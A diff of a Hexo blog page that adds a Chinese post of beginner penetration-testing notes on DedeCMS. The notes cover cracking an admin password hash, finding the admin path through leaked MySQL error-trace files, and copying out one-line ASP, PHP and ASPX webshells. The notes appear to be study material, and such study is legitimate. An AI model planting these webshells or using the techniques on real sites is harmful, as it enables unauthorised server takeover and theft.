@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>x5s0ff&#39;s Studio</title>
+    <title>渗透测试入门笔记A · x5s0ff&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">x5s0ff&#39;s Studio</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">渗透测试入门笔记A</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">x5s0ff's Studio</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            渗透测试入门笔记A
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">290</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/02/13</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,116 +393,81 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/02/13/渗透入门笔记B/">
-            
-                <span>渗透入门笔记B</span>
-        </a>
-        <div class="abstract-content">
-            
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/13</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/02/13/渗透测试入门笔记A/">
-            
-                <span>渗透测试入门笔记A</span>
-        </a>
-        <div class="abstract-content">
-            0x01 网站管理员的密码是多少？可下载爆破工具dedecms.exe,如下图所示：
-此例发现密码哈希值是20位的（注：此处的“位”均为十六进制，而非二进制），这是织梦CMS的特性，可参考https://www.jb51.net/cms/104721.html
-将所得哈希值用MD5解密工具https://md5.navisec.it/search进行解密，也可以用其他MD5解密工具。
-0x02 网站后台目录？织梦CMS是否存在后台地址信息泄露的漏洞，具体可参考：
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="0x01-网站管理员的密码是多少？"><a href="#0x01-网站管理员的密码是多少？" class="headerlink" title="0x01 网站管理员的密码是多少？"></a>0x01 网站管理员的密码是多少？</h1><p>可下载爆破工具dedecms.exe,如下图所示：<br><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms.png" alt=""></p>
+<p>此例发现密码哈希值是20位的（注：此处的“位”均为十六进制，而非二进制），这是织梦CMS的特性，可参考<a href="https://www.jb51.net/cms/104721.html" target="_blank" rel="noopener">https://www.jb51.net/cms/104721.html</a><br><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/dedecms_md5.png" alt=""></p>
+<p>将所得哈希值用MD5解密工具<a href="https://md5.navisec.it/search" target="_blank" rel="noopener">https://md5.navisec.it/search</a>进行解密，也可以用其他MD5解密工具。</p>
+<h1 id="0x02-网站后台目录？"><a href="#0x02-网站后台目录？" class="headerlink" title="0x02 网站后台目录？"></a>0x02 网站后台目录？</h1><p>织梦CMS是否存在后台地址信息泄露的漏洞，具体可参考：</p>
+<blockquote>
+<p><a href="http://blog.csdn.net/wangyi_lin/article/details/9286937" target="_blank" rel="noopener">http://blog.csdn.net/wangyi_lin/article/details/9286937</a></p>
+</blockquote>
+<blockquote>
+<p><a href="http://www.cnblogs.com/hookjoy/p/6996820.html" target="_blank" rel="noopener">http://www.cnblogs.com/hookjoy/p/6996820.html</a></p>
+</blockquote>
+<blockquote>
+<p><a href="http://www.daixiaorui.com/read/14.html" target="_blank" rel="noopener">http://www.daixiaorui.com/read/14.html</a></p>
+</blockquote>
+<p>试着得到后台地址，MySQL报错信息中可能含有后台地址：</p>
+<p>网站地址/data/mysql_error_trace.inc 或者 /data/mysqli_error_trace.inc</p>
+<h1 id="0x03-常用一句话木马"><a href="#0x03-常用一句话木马" class="headerlink" title="0x03 常用一句话木马"></a>0x03 常用一句话木马</h1><blockquote>
+<p>asp一句话木马：</p>
+</blockquote>
+<p>　　 &lt;%execute(request(“value”))%&gt;</p>
+<blockquote>
+<p>php一句话木马：</p>
+</blockquote>
+<p>　　 &lt;?php @eval($_POST[value]);?&gt;</p>
+<blockquote>
+<p>aspx一句话木马：</p>
+</blockquote>
+<p>　　&lt;%@ Page Language=”Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;</p>
+<h1 id="0x04-搭建博客"><a href="#0x04-搭建博客" class="headerlink" title="0x04 搭建博客"></a>0x04 搭建博客</h1><p>请参考 <a href="http://ryane.top/2018/01/10/2018%EF%BC%8C%E4%BD%A0%E8%AF%A5%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BA%86%EF%BC%81/" target="_blank" rel="noopener">http://ryane.top/2018/01/10/2018%EF%BC%8C%E4%BD%A0%E8%AF%A5%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BA%86%EF%BC%81/</a></p>
 
-http://blog.csdn.net/wangyi_lin/article/details/9286937
-
-
-http...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/13</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/31/网页查看cookie/">
-            
-                <span>网页查看cookie</span>
-        </a>
-        <div class="abstract-content">
-            0x01 打开所需网站0x02 右键单击“检查”，点击Network
-0x03 点击第一个文件,查看Headers里的Request Headers，如下图所示cookie
-
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">xxxx_daC</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/02/13/渗透测试入门笔记A/">http://yoursite.com/2019/02/13/渗透测试入门笔记A/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/02/13/渗透测试入门笔记A/">February 13th 2019, 9:49:31 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/02/13/渗透测试入门笔记A/">February 15th 2019, 5:58:04 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/31</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/23/hello-world/">
-            
-                <span>Hello World</span>
-        </a>
-        <div class="abstract-content">
-            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post1$ hexo new "My New Post"
-More info: Writing
-Run server1$ hexo server
-More...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/23</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/02/13/渗透入门笔记B/" title="渗透入门笔记B">
+                    <div class="nextTitle">渗透入门笔记B</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/01/31/网页查看cookie/" title="网页查看cookie">
+                    <div class="prevTitle">网页查看cookie</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -532,6 +552,24 @@ More...
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-网站管理员的密码是多少？"><span class="toc-number">1.</span> <span class="toc-text">0x01 网站管理员的密码是多少？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-网站后台目录？"><span class="toc-number">2.</span> <span class="toc-text">0x02 网站后台目录？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-常用一句话木马"><span class="toc-number">3.</span> <span class="toc-text">0x03 常用一句话木马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-搭建博客"><span class="toc-number">4.</span> <span class="toc-text">0x04 搭建博客</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -687,6 +725,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
